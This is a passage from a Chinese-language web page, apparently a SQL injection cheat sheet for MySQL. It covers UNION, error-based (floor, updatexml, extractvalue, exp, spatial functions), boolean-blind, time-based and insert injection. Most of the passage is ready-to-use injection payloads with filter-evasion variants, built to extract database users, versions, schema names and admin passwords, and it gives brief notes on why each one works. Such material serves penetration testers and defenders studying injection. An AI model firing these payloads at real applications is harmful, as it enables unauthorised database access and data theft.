</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>UNION</span><span class=w> </span><span class=k>ALL</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=k>null</span><span class=p>,</span><span class=k>null</span><span class=p>,</span><span class=k>null</span><span class=w> </span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=mi>10</span><span class=w> </span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=mi>5</span><span class=w>  </span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=mi>2</span><span class=w>  </span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>....</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=基本用法>基本用法</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>admin</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=过滤了逗号的-union-注入>过滤了逗号的 union 注入</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>version</span><span class=p>())</span><span class=n>a</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>database</span><span class=p>())</span><span class=n>b</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>database</span><span class=p>())</span><span class=k>c</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-----------------+------+------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w>               </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-----------------+------+------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w>               </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>3</span><span class=p>.</span><span class=mi>11</span><span class=o>-</span><span class=n>MariaDB</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-----------------+------+------+
</span></span></span></code></pre></td></tr></table></div></div><h3 id=报错注入>报错注入</h3><p>利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。</p><h4 id=分类>分类</h4><p>MYSQL报错注入大体可以分为以下几类：</p><ul><li>BIGINT等数据类型溢出</li><li>xpath语法错误</li><li>concat+rand()+group_by()导致主键重复</li><li>空间数据类型函数错误</li></ul><h4 id=floor>floor</h4><h5 id=注入语句>注入语句</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
</span></span></code></pre></td></tr></table></div></div><ul><li>floor：函数只返回整数部分，小数部分舍弃。</li><li>round：函数四舍五入，大于0.5的部分进位，不到则舍弃。</li></ul><h5 id=注入原理>注入原理</h5><p>目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。</p><p>下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this:
</span></span></code></pre></td></tr></table></div></div><p>官方文档中的意思是：在<code>where</code>语句中，<code>where</code>每执行一次，<code>rand()</code>函数就会被计算一次。<code>rand()</code>不能作为<code>order by</code>的条件字段，同理也不能作为<code>group by</code>的条件字段。</p><p>因此在 mysql 中，可以构造一个值不确定而有可重复的字段作为<code>group by</code>的条件字段，这是就可以报出类似于<code>Duplicate entry ‘…’ for key ‘group_key’</code>的错误</p><h4 id=updatexml有长度限制最长32位>UpdateXml(有长度限制,最长32位)</h4><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是<code>ExtractValue()</code>和<code>UpdateXML()</code></p><p>因此在mysql 小于5.1.5中不能用<code>ExtractValue</code>和<code>UpdateXML</code>进行报错注入。</p><h5 id=注入语句-1>注入语句</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
</span></span></code></pre></td></tr></table></div></div><h5 id=注入原理-1>注入原理</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>UPDATEXML (XML_document, XPath_string, new_value);
</span></span></code></pre></td></tr></table></div></div><ul><li>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc</li><li>第二个参数：XPath_string ( Xpath 格式的字符串)</li><li>第三个参数：new_value，String 格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值</li></ul><p>返回结果为连接参数产生的字符串。如有任何一个参数为<code>NULL</code> ，则返回值为<code>NULL</code>。</p><p>通过查询<code>@@version</code>,返回版本。然后<code>CONCAT</code>将其字符串化。因为<code>UPDATEXML</code>第二个参数需要<code>Xpath</code>格式的字符串,所以不符合要求，然后报错。</p><h4 id=extractvalue有长度限制最长32位>ExtractValue(有长度限制,最长32位)</h4><h5 id=注入语句-2>注入语句</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))
</span></span></code></pre></td></tr></table></div></div><h5 id=注入原理-2>注入原理</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>EXTRACTVALUE (XML_document, XPath_string);
</span></span></code></pre></td></tr></table></div></div><ul><li>第一个参数：XML_document是 String 格式，为 XML 文档对象的名称，文中为 Doc</li><li>第二个参数：XPath_string ( Xpath 格式的字符串)</li><li>作用：从目标 XML 中返回包含所查询值的字符串</li></ul><p>第二个参数都要求是符合<code>xpath</code>语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里</p><h4 id=name_const适用于低版本不太好用>NAME_CONST(适用于低版本，不太好用)</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)
</span></span></code></pre></td></tr></table></div></div><h4 id=error-based-double-query-injection>Error based Double Query Injection</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1
</span></span></code></pre></td></tr></table></div></div><h4 id=exp555以上>exp(5.5.5以上)</h4><p>在 mysql 5.5 之前，整形溢出是不会报错的，根据官方文档说明<code>out-of-range-and-overflow</code>，只有版本号大于5.5.5 时，才会报错。利用<code>exp</code>函数也产生类似的溢出错误</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=1 and (select exp(~(select * from(select user())x)))
</span></span></code></pre></td></tr></table></div></div><h4 id=测试未通过存在可用性的>测试未通过，存在可用性的</h4><p>emetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()</p><p>以上函数均为MySQL中的空间数据类型（存储）的函数，目前仅在MyISAM数据引擎下提供空间索引支持,要求几何字段非空</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>multipoint()
</span></span><span class=line><span class=cl>?id=1 or multipoint((select * from(select * from(select user())a)b))%23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>multipolygon()
</span></span><span class=line><span class=cl>?id=1 or multipolygon((select * from(select * from(select database())a)b))%23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>multilinestring()
</span></span><span class=line><span class=cl>?id=1 or multilinestring((select * from(select * from(select user())a)b))%23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>linestring()
</span></span><span class=line><span class=cl>?id=1 or LINESTRING((select * from(select * from(select user())a)b))%23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>GeometryCollection()
</span></span><span class=line><span class=cl>?id=1 or GeometryCollection((select * from(select * from(select user())a)b))%23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>polygon()
</span></span><span class=line><span class=cl>?id=1 or polygon((select * from(select * from(select user())a)b))%23
</span></span></code></pre></td></tr></table></div></div><h3 id=bool-盲注>Bool 盲注</h3><p>在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。</p><ul><li>正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入</li><li>正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。</li><li>提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。</li></ul><p>几种简单的判断语句，在真实利用中需要根据情况而变化:</p><ul><li>CASE</li><li>IF()</li><li>IFNULL()</li><li>NULLIF()</li></ul><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用<code>binary()</code>函数使大小写敏感。</p><h4 id=构造-bool-条件>构造 bool 条件</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>//正常情况
</span></span><span class=line><span class=cl>&#39;or bool#
</span></span><span class=line><span class=cl>true&#39;and bool#
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>//不使用空格、注释
</span></span><span class=line><span class=cl>&#39;or(bool)=&#39;1
</span></span><span class=line><span class=cl>true&#39;and(bool)=&#39;1
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>//不使用or、and、注释
</span></span><span class=line><span class=cl>&#39;^!(bool)=&#39;1
</span></span><span class=line><span class=cl>&#39;=(bool)=&#39;
</span></span><span class=line><span class=cl>&#39;||(bool)=&#39;1
</span></span><span class=line><span class=cl>true&#39;%26%26(bool)=&#39;1
</span></span><span class=line><span class=cl>&#39;=if((bool),1,0)=&#39;0
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>//不使用等号、空格、注释
</span></span><span class=line><span class=cl>&#39;or(bool)&lt;&gt;&#39;0
</span></span><span class=line><span class=cl>&#39;or((bool)in(1))or&#39;0
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>//其他
</span></span><span class=line><span class=cl>or (case when (bool) then 1 else 0 end)
</span></span></code></pre></td></tr></table></div></div><p>有时候<code>where</code>字句有括号又猜不到 SQL 语句的时候，可以有下列类似的 fuzz</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; or (bool) or &#39;</span><span class=mi>1</span><span class=s1>&#39;=&#39;</span><span class=mi>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=o>%</span><span class=s1>&#39; and (bool) or 1=1 and &#39;</span><span class=mi>1</span><span class=s1>&#39;=&#39;</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>有时候也可以通过与表中的数据进行对比</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mysql&gt; select * from admin where username=&#34;&#34; || id=2 &amp;&amp; password&lt;&#34;5&#34;;
</span></span><span class=line><span class=cl>+----+----------+----------+------+
</span></span><span class=line><span class=cl>| id | username | password | num  |
</span></span><span class=line><span class=cl>+----+----------+----------+------+
</span></span><span class=line><span class=cl>|  2 | admin    | 456      |   20 |
</span></span><span class=line><span class=cl>+----+----------+----------+------+
</span></span><span class=line><span class=cl>1 row in set (0.00 sec)
</span></span><span class=line><span class=cl>mysql&gt; select * from admin where username=&#34;&#34; || id=3 &amp;&amp; password&lt;&#34;8&#34;;
</span></span><span class=line><span class=cl>+----+----------+----------+------+
</span></span><span class=line><span class=cl>| id | username | password | num  |
</span></span><span class=line><span class=cl>+----+----------+----------+------+
</span></span><span class=line><span class=cl>|  3 | test     | 789      |   30 |
</span></span><span class=line><span class=cl>+----+----------+----------+------+
</span></span><span class=line><span class=cl>1 row in set (0.00 sec)
</span></span><span class=line><span class=cl>mysql&gt; select * from admin where username=&#34;&#34; || id=3 &amp;&amp; password&lt;&#34;7&#34;;
</span></span><span class=line><span class=cl>Empty set (0.00 sec)
</span></span></code></pre></td></tr></table></div></div><p>这样通过id指定的话改一下payload直接上脚本把数据全脱了。另外如果想跨表查询的话</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mysql&gt; select a.password&lt;&#39;z&#39; from users a limit 1,1;
</span></span><span class=line><span class=cl>+----------------+
</span></span><span class=line><span class=cl>| a.password&lt;&#39;z&#39; |
</span></span><span class=line><span class=cl>+----------------+
</span></span><span class=line><span class=cl>|              1 |
</span></span><span class=line><span class=cl>+----------------+
</span></span></code></pre></td></tr></table></div></div><h4 id=构造逻辑判断>构造逻辑判断</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>left(user(),1)&gt;&#39;r&#39;  
</span></span><span class=line><span class=cl>right(user(),1)&gt;&#39;r&#39;  
</span></span><span class=line><span class=cl>substr(user(),1,1)=&#39;r&#39;  
</span></span><span class=line><span class=cl>mid(user(),1,1)=&#39;r&#39; 
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>//不使用逗号 
</span></span><span class=line><span class=cl>user() regexp &#39;^[a-z]&#39;
</span></span><span class=line><span class=cl>user() like &#39;root%&#39;
</span></span><span class=line><span class=cl>POSITION(&#39;root&#39; in user())
</span></span><span class=line><span class=cl>mid(user() from 1 for 1)=&#39;r&#39;
</span></span><span class=line><span class=cl>mid(user() from 1)=&#39;r&#39;
</span></span></code></pre></td></tr></table></div></div><p><code>ASCII()</code>、<code>ORD()</code>和<code>CHAR()</code>函数一般用做辅助。</p><h4 id=利用-order-by-盲注>利用 order by 盲注</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mysql&gt; select * from admin where username=&#39;&#39; or 1 union select 1,2,&#39;5&#39; order by 3;
</span></span><span class=line><span class=cl>+----+----------+----------------------------------+
</span></span><span class=line><span class=cl>| id | username | password                         |
</span></span><span class=line><span class=cl>+----+----------+----------------------------------+
</span></span><span class=line><span class=cl>|  1 | 2        | 5                                |
</span></span><span class=line><span class=cl>|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
</span></span><span class=line><span class=cl>+----+----------+----------------------------------+
</span></span><span class=line><span class=cl>2 rows in set (0.00 sec)
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>mysql&gt; select * from admin where username=&#39;&#39; or 1 union select 1,2,&#39;6&#39; order by 3;
</span></span><span class=line><span class=cl>+----+----------+----------------------------------+
</span></span><span class=line><span class=cl>| id | username | password                         |
</span></span><span class=line><span class=cl>+----+----------+----------------------------------+
</span></span><span class=line><span class=cl>|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
</span></span><span class=line><span class=cl>|  1 | 2        | 6                                |
</span></span><span class=line><span class=cl>+----+----------+----------------------------------+
</span></span><span class=line><span class=cl>2 rows in set (0.01 sec)
</span></span></code></pre></td></tr></table></div></div><p>这种注入一般出现在登录处，形成<code>bool</code>条件。这里只获取<code>password</code>的值，也可以跟多个<code>UNION</code>查询其他的数据，此方法优点在于不使用括号等号等字符。利用<code>order by</code>姿势很多，自由发挥了。</p><h3 id=延时注入>延时注入</h3><p>一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况：</p><ul><li>SLEEP(n) 让mysql停n秒钟</li><li>BENCHMARK(count,expr) 重复countTimes次执行表达式expr，如<code>BENCHMARK(100000,MD5(1))</code></li></ul><p><code>BENCHMARK()</code>用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用<code>sleep()</code>。</p><p>一些注意事项：</p><ul><li>使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。</li><li>时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。</li><li>当在页面上看不到任何明显变化时，再考虑选择使用延时注入</li></ul><p>相对于bool盲注，就是把返回值0和1改为是否执行延时，<strong>能用其他方法就不使用延时</strong>。</p><p>一般格式<code>if((bool),sleep(3),0)</code>和<code>or (case when (bool) then sleep(3) else 0 end)</code></p><p>如果这两个函数ban掉的话可以利用笛卡尔积造成延迟来进行注入。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39; and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)#
</span></span></code></pre></td></tr></table></div></div><p>另外还可以利用不正确的正则表达式来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select if(substr((select 1)=&#39;1&#39;,1,1),concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);
</span></span></code></pre></td></tr></table></div></div><h4 id=检测方法>检测方法</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1 OR SLEEP(25)=0 LIMIT 1 #
</span></span><span class=line><span class=cl>1) OR SLEEP(25)=0 LIMIT 1 #
</span></span><span class=line><span class=cl>1&#39; OR SLEEP(25)=0 LIMIT 1 #
</span></span><span class=line><span class=cl>&#39;) OR SLEEP(25)=0 LIMIT 1 #
</span></span><span class=line><span class=cl>1)) OR SLEEP(25)=0 LIMIT 1 #
</span></span><span class=line><span class=cl>SELECT SLEEP(25) #
</span></span></code></pre></td></tr></table></div></div><h4 id=payload>payload</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=k>IF</span><span class=p>(</span><span class=n>SUBSTR</span><span class=p>((</span><span class=k>SELECT</span><span class=w> </span><span class=n>GROUP_CONCAT</span><span class=p>(</span><span class=k>schema_name</span><span class=w> </span><span class=n>SEPARATOR</span><span class=w> </span><span class=mi>0</span><span class=n>x3c62723e</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>INFORMATION_SCHEMA</span><span class=p>.</span><span class=n>SCHEMATA</span><span class=p>),</span><span class=n>i</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>j</span><span class=p>,</span><span class=n>BENCHMARK</span><span class=p>(</span><span class=mi>100000</span><span class=p>,</span><span class=n>SHA1</span><span class=p>(</span><span class=mi>1</span><span class=p>)),</span><span class=mi>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=k>IF</span><span class=p>(</span><span class=n>SUBSTR</span><span class=p>((</span><span class=k>SELECT</span><span class=w> </span><span class=n>GROUP_CONCAT</span><span class=p>(</span><span class=k>schema_name</span><span class=w> </span><span class=n>SEPARATOR</span><span class=w> </span><span class=mi>0</span><span class=n>x3c62723e</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>INFORMATION_SCHEMA</span><span class=p>.</span><span class=n>SCHEMATA</span><span class=p>),</span><span class=n>i</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>j</span><span class=p>,</span><span class=n>SLEEP</span><span class=p>(</span><span class=mi>10</span><span class=p>),</span><span class=mi>0</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=insertupdatedelete-注入>insert/update/delete 注入</h3><h4 id=insert>insert</h4><p>报错注入方式：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>insert</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>message</span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=n>user_id</span><span class=p>,</span><span class=n>message_id</span><span class=p>)</span><span class=w> </span><span class=k>values</span><span class=w> </span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=s1>&#39;zedd&#39;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=o>@@</span><span class=k>version</span><span class=p>),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;hi&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
